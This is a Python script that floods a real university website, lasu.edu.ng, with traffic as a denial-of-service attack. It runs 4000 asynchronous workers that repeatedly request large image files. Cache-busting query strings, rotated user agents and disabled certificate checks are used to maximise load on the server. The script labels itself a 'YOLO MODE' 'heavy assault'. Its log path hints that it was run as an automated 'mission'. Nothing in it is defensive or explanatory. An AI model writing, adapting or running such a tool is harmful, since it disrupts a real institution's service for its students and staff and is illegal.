import asyncio
import random
import time
import socket
import ssl
import sys

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# LASU Heavy Resource Targets (>1MB each)
HEAVY_PATHS = [
    "/home/img/convocation_image.png",
    "/home/img/nuga_slide.png",
    "/home/img/banner_new.png",
    "/home/img/slide11.png",
    "/home/img/LASU_VC_message.png",
    "/home/img/banner_new3.png",
    "/home/img/banner_slider99.jpg",
    "/home/img/banner_slider88.jpg"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

async def assault_worker(host, port, stats):
    """
    High-speed asynchronous worker targeting heavy assets.
    Uses 'Connection: keep-alive' to force server to hold large files in buffer.
    """
    while True:
        try:
            path = random.choice(HEAVY_PATHS)
            # Create SSL context for Port 443
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            reader, writer = await asyncio.open_connection(host, port, ssl=context)
            
            stats['active'] += 1
            
            # Rapid-fire requests on the same connection if possible, or new ones
            for _ in range(5):
                query = f"GET {path}?cb={random.getrandbits(32)} HTTP/1.1
"
                writer.write(query.encode())
                writer.write(f"Host: {host}
".encode())
                writer.write(f"User-Agent: {random.choice(USER_AGENTS)}
".encode())
                writer.write(b"Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
")
                writer.write(b"Connection: keep-alive

")
                await writer.drain()
                stats['hits'] += 1
                
                # Small jitter to keep connection alive but aggressive
                await asyncio.sleep(0.1)
                
        except Exception:
            stats['errors'] += 1
        finally:
            if 'writer' in locals():
                try:
                    stats['active'] -= 1
                    writer.close()
                except: pass
            # Zero delay restart
            await asyncio.sleep(0.01)

async def monitor(stats):
    start_time = time.time()
    log_file = "/root/gemini-bridge/missions/advanced_flooder/lasu_assault.log"
    while True:
        elapsed = time.time() - start_time
        cps = stats['hits'] / elapsed if elapsed > 0 else 0
        status = f"[{time.strftime('%H:%M:%S')}] Active: {stats['active']} | Total Hits: {stats['hits']} | CPS: {cps:.2f} | Errors: {stats['errors']}
"
        print(status, end="", flush=True)
        with open(log_file, "a") as f:
            f.write(status)
        await asyncio.sleep(1)

async def main():
    host = "lasu.edu.ng"
    port = 443
    concurrency = 4000 # High intensity
    
    stats = {'active': 0, 'hits': 0, 'errors': 0}
    
    print(f"🔥 [YOLO MODE] LASU HEAVY ASSAULT STARTING...")
    print(f"🚀 Targeting {len(HEAVY_PATHS)} files (>1MB each) on {host}")
    print(f"⚡ Workers: {concurrency}")
    
    # Increase system limits
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (1000000, 1000000))
    except: pass

    workers = [asyncio.create_task(assault_worker(host, port, stats)) for _ in range(concurrency)]
    monitor_task = asyncio.create_task(monitor(stats))
    
    await asyncio.gather(monitor_task, *workers)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("
🛑 Assault Stopped.")
